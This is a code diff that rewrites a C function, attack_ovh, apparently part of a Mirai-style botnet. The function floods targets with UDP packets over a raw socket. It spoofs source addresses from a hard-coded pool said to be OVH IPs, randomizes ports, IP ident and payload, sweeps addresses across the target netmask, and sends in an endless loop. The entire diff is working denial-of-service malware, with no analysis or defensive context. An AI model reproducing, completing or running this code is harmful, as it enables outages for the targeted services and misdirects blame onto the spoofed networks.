@@ -54,20 +54,16 @@ static unsigned long int ovh_rand(void)
 void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd;
-    char datagram[1518];
-    struct iphdr *iph = (struct iphdr *)datagram;
-    struct udphdr *udph = (struct udphdr *)(iph + 1);
-    
+    char **pkts = calloc(targs_len, sizeof(char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 128);
+    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
     int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);
-
-    if (data_len > 1400)
-        data_len = 1400;
-    if (data_len < 100)
-        data_len = 100;
 
     // Large pool of OVH source IPs for spoofing (already in network byte order)
     uint32_t ovh_ips[] = {
@@ -85,91 +81,95 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     };
     int num_ovh_ips = sizeof(ovh_ips) / sizeof(ovh_ips[0]);
 
+    if (data_len > 1460)
+        data_len = 1460;
+
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
 #ifdef DEBUG
-        printf("Failed to create raw socket: %s\n", strerror(errno));
+        printf("Failed to create raw socket. Aborting attack\n");
 #endif
         return;
     }
-
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
-        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
+        printf("Failed to set IP_HDRINCL. Aborting\n");
 #endif
         close(fd);
         return;
     }
 
     ovh_srand(time(NULL));
-    memset(datagram, 0, sizeof(datagram));
 
-    // Setup IP header
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = ip_tos;
-    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
-    iph->id = 0;
-    iph->frag_off = 0;
-    iph->ttl = ip_ttl;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0;
-    iph->saddr = LOCAL_ADDR;
+    for (i = 0; i < targs_len; i++)
+    {
+        struct iphdr *iph;
+        struct udphdr *udph;
 
-    // Setup UDP header
-    udph->source = htons(rand_next() % 65535);
-    udph->dest = htons(dport);
-    udph->len = htons(sizeof(struct udphdr) + data_len);
-    udph->check = 0;
+        pkts[i] = calloc(1510, sizeof(char));
+        iph = (struct iphdr *)pkts[i];
+        udph = (struct udphdr *)(iph + 1);
 
-    // Pre-generate random payload
-    char payload[1400];
-    for (i = 0; i < (int)sizeof(payload); i++)
-        payload[i] = rand_next() & 0xff;
+        iph->version = 4;
+        iph->ihl = 5;
+        iph->tos = ip_tos;
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
+        iph->id = htons(ip_ident);
+        iph->ttl = ip_ttl;
+        if (dont_frag)
+            iph->frag_off = htons(1 << 14);
+        iph->protocol = IPPROTO_UDP;
+        iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
+        iph->daddr = targs[i].addr;
+
+        udph->source = htons(sport);
+        udph->dest = htons(dport);
+        udph->len = htons(sizeof(struct udphdr) + data_len);
+    }
 
     int sent = 0;
-    int sleeptime = 100;
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
-            struct sockaddr_in sin;
+            char *pkt = pkts[i];
+            struct iphdr *iph = (struct iphdr *)pkt;
+            struct udphdr *udph = (struct udphdr *)(iph + 1);
 
-            sin.sin_family = AF_INET;
-            sin.sin_addr.s_addr = targs[i].addr;
-            sin.sin_port = htons(dport);
-
-            // Randomize source IP from OVH pool
+            // Randomize source IP from OVH pool on each packet
             iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
 
-            // Randomize source port
-            udph->source = htons((ovh_rand() & 0xffff) % 65535);
+            if (targs[i].netmask < 32)
+                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
-            // Randomize payload (vary length)
-            int pkt_len = data_len;
-            if (ovh_rand() % 2 == 0)
-                pkt_len = data_len / 2;
-            if (pkt_len < 64) pkt_len = 64;
+            if (ip_ident == 0xffff)
+                iph->id = (uint16_t)rand_next();
+            if (sport == 0xffff)
+                udph->source = rand_next();
+            if (dport == 0xffff)
+                udph->dest = rand_next();
 
-            util_memcpy((void *)udph + sizeof(struct udphdr), payload, pkt_len);
-            udph->len = htons(sizeof(struct udphdr) + pkt_len);
+            // Randomize payload
+            if (data_rand)
+                rand_str((char *)(udph + 1), data_len);
 
-            // Update IP header
-            iph->id = htons(ovh_rand() & 0xffff);
-            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + pkt_len);
             iph->check = 0;
             iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
-            sendto(fd, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);
+
+            targs[i].sock_addr.sin_port = udph->dest;
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
 
             sent++;
             if (pps_limiter > 0 && sent >= pps_limiter)
             {
                 sent = 0;
-                usleep(sleeptime * 10);
+                usleep(1000);
             }
         }
     }
